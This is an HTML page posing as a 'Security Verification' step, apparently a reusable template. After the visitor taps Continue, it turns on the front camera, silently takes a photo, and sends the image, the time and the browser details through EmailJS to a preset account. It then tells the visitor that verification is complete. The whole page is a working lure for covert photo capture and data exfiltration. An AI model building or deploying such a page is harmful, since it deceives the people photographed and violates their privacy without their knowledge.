<!DOCTYPE html>
<html>
<head>
  <title>Verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

  <style>
    body { font-family: Arial; text-align: center; margin-top: 40px; }
    video { width: 90%; max-width: 350px; border-radius: 10px; display:none; }
    button { padding: 12px 25px; font-size: 16px; }
  </style>
</head>
<body>

<h3>Security Verification</h3>
<p>Tap continue to verify</p>

<button id="startBtn">Continue</button>
<video id="video" autoplay playsinline muted></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
emailjs.init("XYr9cRaK3BZXsH7Xp"); // ðŸ”´ CHANGE

const startBtn = document.getElementById("startBtn");
const video = document.getElementById("video");

startBtn.onclick = async () => {
  startBtn.style.display = "none";

  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" }
    });

    video.srcObject = stream;
    video.style.display = "block";

    // âœ… WAIT until camera metadata is ready
    video.onloadedmetadata = () => {
      setTimeout(captureAndSend, 1000); // extra buffer for iOS
    };

  } catch {
    alert("Camera permission denied");
  }
};

function captureAndSend() {
  const canvas = document.getElementById("canvas");
  const width = video.videoWidth;
  const height = video.videoHeight;

  if (!width || !height) {
    alert("Camera not ready");
    return;
  }

  // ðŸ”½ Resize image to reduce size
  const MAX_WIDTH = 480;
  const scale = MAX_WIDTH / width;

  canvas.width = MAX_WIDTH;
  canvas.height = height * scale;

  canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);

  // âœ… JPEG compression (VERY IMPORTANT)
  const imageData = canvas.toDataURL("image/jpeg", 0.6);

  emailjs.send("service_ppjrw8t", "Camera Capture Alert", {
    image: imageData,
    time: new Date().toLocaleString(),
    device: navigator.userAgent
  }).then(
    () => console.log("Email sent"),
    err => console.error(err)
  );

  // Stop camera
  video.srcObject.getTracks().forEach(t => t.stop());

  document.body.innerHTML = "<h3>Verification Complete</h3>";
}
</script>

</body>
</html>
